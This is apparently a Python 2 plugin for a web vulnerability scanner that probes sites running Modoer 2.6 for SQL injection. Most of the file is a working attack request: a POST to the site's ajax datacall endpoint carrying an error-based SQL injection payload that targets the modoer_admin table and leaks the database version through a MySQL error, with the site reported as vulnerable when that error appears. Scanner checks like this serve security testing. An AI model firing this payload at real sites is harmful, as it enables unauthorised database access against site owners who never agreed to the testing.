#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall")
        
        data="datacallname=%E4%B8%BB%E9%A2%98_%E4%BC%9A%E5%91%98%E5%8F%82%E4%B8%8E&idtype=subject_shops&pid=1&effect=1` from modoer_admin as mt where 1=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
        headers={"Host": domain,"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded"}

        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        print content
        if  content.find('Debug backtrace:')>=0 and content.find('MySQL Query Error')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:modoerv26sqlinjecitinScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
    
    return list
#end def